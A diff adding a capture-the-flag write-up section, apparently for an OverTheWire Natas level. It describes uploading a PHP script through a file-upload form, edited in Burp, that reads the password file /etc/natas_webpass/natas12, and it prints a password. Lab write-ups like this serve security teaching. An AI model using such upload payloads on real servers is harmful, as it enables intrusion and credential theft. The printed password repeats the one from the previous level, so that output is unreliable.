@@ -155,3 +155,32 @@ Breaking the encryption was straightforward because of the property that if a ^ 
 pass
 YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
 ```
+## Level 11 → Level 12
+In this challenge, I was tasked with uploading a file, as shown below:   
+![Alt text](image-4.png)   
+After uploading the file, the system provided me with a link to access the uploaded file. My objective was to write a PHP script to retrieve and display the contents of the password file, essentially achieving Remote Code Execution (RCE).
+
+I used Burp to modify the file's content and turned it into a PHP script. The transformation looked like this:
+
+I used burp to edit the file content to php script.
+
+From this
+![Alt text](image-5.png)
+To this:
+![Alt text](image-6.png)
+
+
+```php
+<?php
+$fileContents = file_get_contents('/etc/natas_webpass/natas12');
+if ($fileContents === false) {
+    echo 'Failed to read the file.';
+} else {
+    echo $fileContents;
+}
+?>
+```
+```
+pass
+YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
+```
